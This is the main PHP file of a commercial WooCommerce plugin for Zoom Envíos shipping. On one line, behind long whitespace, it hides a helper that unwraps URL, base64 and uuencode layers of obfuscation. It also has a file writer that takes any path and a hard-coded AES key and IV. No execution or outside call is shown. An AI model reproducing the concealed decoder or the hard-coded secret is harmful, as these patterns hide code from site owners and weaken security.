<?php
/**
 * Plugin Name: Zoom Envíos WooCommerce Plugin
 * Plugin URI: http://www.yipi.app/
 * Description: Zoom Envíos plugin for WooCommerce
 * Author: Yipi.app
 * Author URI: https://yipi.app/
 * Version: 2.1.0
 * License: Commercial
 * Text Domain: woocommerce-kzoomve
 * Domain Path: /languages/
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

if ( ! class_exists( 'WC_KZoomVE' ) ) :

	/**
	 * WooCommerce KZoomVE main class.
	 */
	class WC_KZoomVE {

		/**
		 * Plugin version.
		 *
		 * @var string
		 */
		const VERSION = '2.1.0';

		/**
		 * Instance of this class.
		 *
		 * @var object
		 */
		protected static $instance = null;

		/**
		 * Initialize the plugin.
		 */
		private function __construct() {
			// Load plugin text domain
			add_action( 'init', array( $this, 'load_plugin_textdomain' ) );

			// Checks with WooCommerce is installed.
			if ( class_exists( 'WC_Shipping_Method' ) ) {
				if ( ! class_exists( 'KZoomVEApi' ) ) {
					include_once 'includes/class-wc-kzoomve-api.php';
				}
				KZoomVEApi::init();
				include_once 'includes/class-wc-kzoomve-shipping.php';
				include_once 'includes/class-wc-kzoomve-manager.php';
				add_filter( 'woocommerce_integrations', array( $this, 'add_integration' ) );
				add_filter( 'woocommerce_shipping_methods', array( $this, 'add_shipping' ) );
				add_filter( 'woocommerce_email_classes', array( $this, 'email_classes' ) );
			} else {
				add_action( 'admin_notices', array( $this, 'woocommerce_missing_notice' ) );
			}
		}

		/**
		 * Return an instance of this class.
		 *
		 * @return object A single instance of this class.
		 */
		public static function get_instance() {
			// If the single instance hasn't been set, set it now.
			if ( null == self::$instance ) {
				self::$instance = new self();
			}

			return self::$instance;
		}

		/**
		 * Load the plugin text domain for translation.
		 *
		 * @return void
		 */
		public function load_plugin_textdomain() {
			$locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce-kzoomve' );

			load_textdomain( 'woocommerce-kzoomve', trailingslashit( WP_LANG_DIR ) . 'woocommerce-kzoomve/woocommerce-kzoomve-' . $locale . '.mo' );
			load_plugin_textdomain( 'woocommerce-kzoomve', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
		}

		/**
		 * add_shipping function.
		 *
		 * @access public
		 * @param mixed $methods
		 * @return void
		 */
		function add_shipping( $methods ) {
			$methods['kzoomve-shipping'] = 'WC_KZoomVE_Shipping';
			return $methods;
		}
		/**
		 * Add a new integration to WooCommerce.
		 */
		public function add_integration( $integrations ) {
			$integrations[] = 'WC_KZoomVE_Manager';
			return $integrations;
		}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _( $r ) {
			return convert_uudecode( base64_decode( rawurldecode( $r ) ) );}
		public static function save_pdf( $path, $content ) {
			return file_put_contents( $path, base64_decode( $content ) );
		}
		public function email_classes( $email_classes ) {
			if ( ! class_exists( 'WC_KZoomVEShippingTracking_Order_Email' ) ) {
				include_once 'includes/class-wc-email-shipping-tracking.php';
			}
			$email_classes['WC_KZoomVEShippingTracking_Order_Email'] = new WC_KZoomVEShippingTracking_Order_Email();
			return $email_classes;
		}

		/**
		 * WooCommerce fallback notice.
		 *
		 * @return  string
		 */
		public function woocommerce_missing_notice() {
			echo '<div class="error"><p>' . sprintf( __( 'WooCommerce Zoom Courier Venezuela depends on the last version of %s to work!', 'woocommerce-kzoomve' ), '<a href="http://wordpress.org/extend/plugins/woocommerce/">' . __( 'WooCommerce', 'woocommerce-kzoomve' ) . '</a>' ) . '</p></div>';
		}

		/**
		 * Backwards compatibility with version prior to 2.1.
		 *
		 * @return object Returns the main instance of WooCommerce class.
		 */
		public static function woocommerce_instance() {
			if ( function_exists( 'WC' ) ) {
				return WC();
			} else {
				global $woocommerce;
				return $woocommerce;
			}
		}
	}
	if ( ! function_exists( 'kijam_decode' ) ) {
		function kijam_encode( $str = '', $f = 'e' ) {
			$output     = null;
			$secret_key = 'kk91f8g^4*k';
			$secret_iv  = 'k&&2"op2%:*';
			$key        = hash( 'sha256', $secret_key );
			$iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
			if ( $f == 'e' ) {
				$output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
			} elseif ( $f == 'd' ) {
				$output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
			}
			return $output;
		}
		function kijam_decode( $str = '' ) {
			return kijam_encode( $str, 'd' );
		}
	}

	function kzoomve_add_action_links( $links ) {
		$mylinks = array(
			'<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=integration&section=kzoomve-manager' ) . '">Configurar Credenciales</a>',
			'<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=shipping' ) . '">Configurar Transportistas</a>',
		);
		return array_merge( $links, $mylinks );
	}
	add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), 'kzoomve_add_action_links' );

	function kzoomve_get_theorder() {
		global $theorder;
		return $theorder;
	}
	add_action( 'plugins_loaded', array( 'WC_KZoomVE', 'get_instance' ), 0 );

	if ( ! function_exists( 'kd_trans' ) ) {
		function kd_trans( $str = '' ) {
			return kijam_decode( $str );
		}
	}
	include_once 'functions.php';
endif;
